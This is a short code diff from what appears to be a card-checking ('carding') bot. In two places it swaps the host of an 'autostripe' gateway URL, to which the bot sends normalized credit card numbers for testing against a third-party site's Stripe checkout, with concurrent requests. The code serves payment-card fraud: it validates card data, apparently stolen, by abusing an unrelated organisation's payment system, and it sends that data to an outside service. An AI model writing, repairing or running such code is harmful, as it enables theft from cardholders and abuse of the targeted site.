@@ -1893,7 +1893,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
 
         # Call main API
         api_url = (
-            "https://darkboy-auto-stripe-y6qk.onrender.com/"
+            "https://stripe.stormx.pw/"
             f"gateway=autostripe/key=darkboy/site=shebrews.org/cc={cc_normalized}"
         )
         async with aiohttp.ClientSession() as session:
@@ -2559,7 +2559,7 @@ from db import get_user, update_user
 
 # --- SETTINGS ---
 API_URL_TEMPLATE = (
-    "https://darkboy-auto-stripe-y6qk.onrender.com/"
+    "https://stripe.stormx.pw/"
     "gateway=autostripe/key=darkboy/site=shebrews.org/cc="
 )
 CONCURRENCY = 3
